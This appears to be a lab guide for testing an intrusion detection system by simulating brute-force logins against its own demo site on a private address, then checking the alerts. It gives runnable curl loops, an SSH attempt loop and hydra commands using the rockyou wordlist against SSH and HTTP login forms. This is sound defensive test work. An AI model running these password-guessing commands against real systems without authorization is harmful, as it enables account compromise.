# Brute Force Attack Simulation Guide

## Quick Method (Demo Site - Easiest)

The demo site on port 8080 is perfect for testing brute force attacks.

### On Kali Linux:

```bash
# Set your IDS server IP
IDS_IP="192.168.100.4"

# Method 1: Simple curl loop (15+ failed attempts)
echo "Starting brute force attack..."
for i in {1..20}; do
  echo "Attempt $i..."
  curl -s -X POST http://$IDS_IP:8080/login \
    -d "username=admin&password=wrongpass$i" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --max-time 2 > /dev/null
  sleep 0.3
done
echo "Brute force attack completed!"
```

### What This Does:
- Sends 20 failed login attempts
- Each with wrong password
- Triggers brute force detection after 10+ failed attempts

---

## Advanced Methods

### Method 2: SSH Brute Force (if SSH is enabled)

```bash
# Using hydra (if installed)
hydra -l admin -P /usr/share/wordlists/rockyou.txt $IDS_IP ssh

# Or manual attempts
for i in {1..15}; do
  ssh -o ConnectTimeout=2 \
      -o StrictHostKeyChecking=no \
      -o UserKnownHostsFile=/dev/null \
      admin@$IDS_IP "exit" 2>&1 | grep -i "permission denied\|connection refused"
  sleep 0.5
done
```

### Method 3: HTTP Login Brute Force with Hydra

```bash
# Install hydra if not installed
sudo apt install hydra -y

# Brute force HTTP login form
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  $IDS_IP http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# Or with custom wordlist
echo -e "password123\nadmin123\nadmin\nroot\npassword" > wordlist.txt
hydra -l admin -P wordlist.txt $IDS_IP http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid"
```

### Method 4: Multiple Usernames + Passwords

```bash
# Try multiple usernames with wrong passwords
for user in admin root user test guest; do
  for i in {1..5}; do
    curl -s -X POST http://$IDS_IP:8080/login \
      -d "username=$user&password=wrong$i" \
      -H "Content-Type: application/x-www-form-urlencoded" > /dev/null
    sleep 0.2
  done
done
```

---

## Quick Test Script

Save this as `brute-force-test.sh`:

```bash
#!/bin/bash
IDS_IP="${1:-192.168.100.4}"

echo "=========================================="
echo "  Brute Force Attack Simulation"
echo "  Target: $IDS_IP:8080"
echo "=========================================="
echo ""

echo "[*] Sending 20 failed login attempts..."
for i in {1..20}; do
  echo -n "Attempt $i... "
  response=$(curl -s -X POST http://$IDS_IP:8080/login \
    -d "username=admin&password=wrongpass$i" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --max-time 2)
  
  if echo "$response" | grep -qi "blocked\|ban\|temporarily"; then
    echo "BLOCKED ✓"
  else
    echo "Failed"
  fi
  
  sleep 0.3
done

echo ""
echo "=========================================="
echo "  Attack Complete!"
echo "  Check IDS Monitoring: http://$IDS_IP:5173"
echo "=========================================="
```

**Make it executable and run:**
```bash
chmod +x brute-force-test.sh
./brute-force-test.sh
```

---

## Expected Detection

After running the attack, check your IDS:

1. **Monitoring Tab**: Look for alerts with:
   - Attack Type: **"Brute Force Attack"** or **"brute_force"**
   - 🚨 **ATTACK DETECTED** badge
   - Source IP: Your Kali Linux IP

2. **Popup Alert**: Should show:
   - "Brute Force Attack"
   - Your Kali IP as source
   - Only **ONE popup** (not multiple)

3. **Demo Site**: After 3 failed attempts, you should see:
   - "Temporarily blocked" message
   - Login button disabled
   - Countdown timer

---

## Tips

- **Start with 15-20 attempts** to trigger detection
- **Wait 5 seconds** between different attack types
- **Check Monitoring tab** after each attack
- **Use different source IPs** if testing from multiple machines

---

## Troubleshooting

**Not detecting?**
- Make sure demo site is running: `http://192.168.100.4:8080`
- Check backend logs: `tail -f /tmp/ids-backend.log | grep brute`
- Verify prediction service is running

**Too many popups?**
- The fix should prevent this - only one popup per attack type per source IP
- If still seeing multiple, clear browser cache and refresh

